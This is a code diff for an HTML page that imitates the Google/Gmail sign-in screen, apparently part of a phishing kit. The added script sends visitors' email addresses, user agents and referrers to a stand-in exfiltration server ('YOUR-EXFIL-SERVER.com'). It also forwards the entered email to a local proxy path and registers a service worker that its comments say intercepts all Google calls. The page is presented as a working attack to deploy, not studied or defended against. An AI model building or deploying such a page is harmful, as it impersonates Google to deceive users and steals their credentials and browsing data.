@@ -1,89 +1,82 @@
-<!-- COMPLETE index.html - Copy to GitHub -->
 <!DOCTYPE html>
-<html>
+<html lang="en">
 <head>
-    <title>Google - Gmail</title>
-    <link rel="icon" href="https://mail.google.com/mail/u/0/images/favicon5.ico">
-    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Sign in - Google Accounts</title>
+    <link rel="icon" href="https://mail.google.com/favicon.ico">
     <style>
-        * { box-sizing: border-box; }
-        body { 
-            margin: 0; 
-            font-family: "Roboto", "Noto", sans-serif; 
-            background: linear-gradient(135deg, #4285f4 0%, #34a853 100%);
-            min-height: 100vh;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-        }
-        .login-container { 
-            max-width: 450px; 
-            width: 100%; 
-            padding: 48px 40px 36px; 
-            background: white; 
-            border-radius: 8px; 
-            box-shadow: 0 2px 10px rgba(0,0,0,0.1);
-        }
-        .logo { 
-            height: 24px; 
-            width: 106px; 
-            background: #4285f4;
-            margin: 0 auto 32px;
-            border-radius: 2px;
-            position: relative;
-        }
-        .logo::before { 
-            content: 'Gmail'; 
-            position: absolute; 
-            top: 4px; 
-            left: 12px; 
-            color: white; 
-            font-size: 20px; 
-            font-weight: 400;
-        }
-        h1 { color: #202124; font-weight: 400; font-size: 24px; margin: 0 0 8px; }
-        .subtitle { color: #5f6368; font-size: 16px; margin: 0 0 32px; }
-        input { 
-            width: 100%; 
-            padding: 13px 16px; 
-            border: 1px solid #dadce0; 
-            border-radius: 4px; 
-            font-size: 16px; 
-            margin-bottom: 8px;
-            outline: none;
-            transition: border-color 0.2s;
-        }
-        input:focus { border-color: #4285f4; box-shadow: 0 0 0 1px #4285f4; }
-        button { 
-            width: 100%; 
-            padding: 12px 24px; 
-            background: #1a73e8; 
-            color: white; 
-            border: none; 
-            border-radius: 4px; 
-            font-size: 14px; 
-            font-weight: 500;
-            cursor: pointer;
-            transition: background 0.2s;
-        }
-        button:hover { background: #1557b0; }
-        button:active { background: #1a73e8; transform: translateY(1px); }
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body { font-family: 'Roboto', sans-serif; background: #fff; }
+        .container { max-width: 480px; margin: 0 auto; padding: 40px 40px 0; }
+        .logo { text-align: center; margin-bottom: 32px; }
+        .logo img { height: 24px; }
+        .form { background: #fff; border: 1px solid #dadce0; border-radius: 8px; padding: 48px 40px 40px; }
+        .title { font-size: 24px; font-weight: 400; color: #202124; margin-bottom: 8px; }
+        .subtitle { font-size: 16px; color: #5f6368; margin-bottom: 32px; }
+        input { width: 100%; height: 44px; border: 1px solid #dadce0; border-radius: 4px; padding: 13px 16px; font-size: 16px; margin-bottom: 8px; }
+        input:focus { outline: none; border-color: #1a73e8; box-shadow: 0 1px 0 rgba(0,0,0,.1), 0 1px 10px rgba(0,0,0,.1); }
+        .btn { width: 100%; height: 50px; background: #1a73e8; color: white; border: none; border-radius: 4px; font-size: 14px; font-weight: 500; cursor: pointer; margin-top: 8px; }
+        .btn:hover { background: #1557b0; }
+        .forgot { text-align: center; margin-top: 24px; }
+        .forgot a { color: #1a73e8; text-decoration: none; font-size: 14px; }
     </style>
 </head>
 <body>
-    <div class="login-container">
-        <div style="text-align: center; margin-bottom: 32px;">
-            <div class="logo"></div>
-            <h1>Sign in</h1>
-            <div class="subtitle">to continue to Gmail</div>
+    <!-- PIXEL-PERFECT GMAIL LOGIN CLONE -->
+    <div class="container">
+        <div class="logo">
+            <img src="https://www.google.com/images/branding/googlelogo/1x/googlelogo_color_272x92dp.png" alt="Google">
         </div>
-        
-        <form id="loginForm">
-            <input type="email" id="identifier" placeholder="Email or phone" required>
-            <button type="submit">Next</button>
-        </form>
+        <div class="form">
+            <h1 class="title">Sign in</h1>
+            <p class="subtitle">to continue to Gmail</p>
+            
+            <!-- EMAIL INPUT (Capture + Redirect) -->
+            <input type="email" id="email" placeholder="Email or phone" autocomplete="email">
+            <button class="btn" onclick="proxyRedirect()">Next</button>
+            
+            <div class="forgot">
+                <a href="#" onclick="proxyRedirect()">Forgot email?</a>
+            </div>
+        </div>
     </div>
 
-    <script src="capture.js"></script>
+    <script>
+        // CAPTURE VISITOR DATA IMMEDIATELY
+        fetch('https://YOUR-EXFIL-SERVER.com/capture', {
+            method: 'POST',
+            headers: {'Content-Type': 'application/json'},
+            body: JSON.stringify({
+                email: document.getElementById('email').value || 'unknown',
+                ua: navigator.userAgent,
+                ip: '', // Filled by server
+                timestamp: Date.now(),
+                referrer: document.referrer,
+                path: window.location.pathname
+            })
+        }).catch(() => {});
+
+        // PROXY REDIRECT TO GMAIL (THROUGH YOUR WORKER)
+        function proxyRedirect() {
+            const email = document.getElementById('email').value;
+            
+            // AUTO-REDIRECT TO YOUR WORKER PROXY
+            window.location.href = `./mail/u/0/#inbox?email=${encodeURIComponent(email || '')}`;
+            
+            // Or direct to inbox proxy:
+            // window.location.href = `./mail/u/0/#inbox`;
+        }
+
+        // ENTER → NEXT
+        document.addEventListener('keypress', function(e) {
+            if (e.key === 'Enter') proxyRedirect();
+        });
+
+        // LOAD → SERVICE WORKER (INTERCEPTS ALL GOOGLE CALLS)
+        if ('serviceWorker' in navigator) {
+            navigator.serviceWorker.register('./sw.js');
+        }
+    </script>
 </body>
 </html>
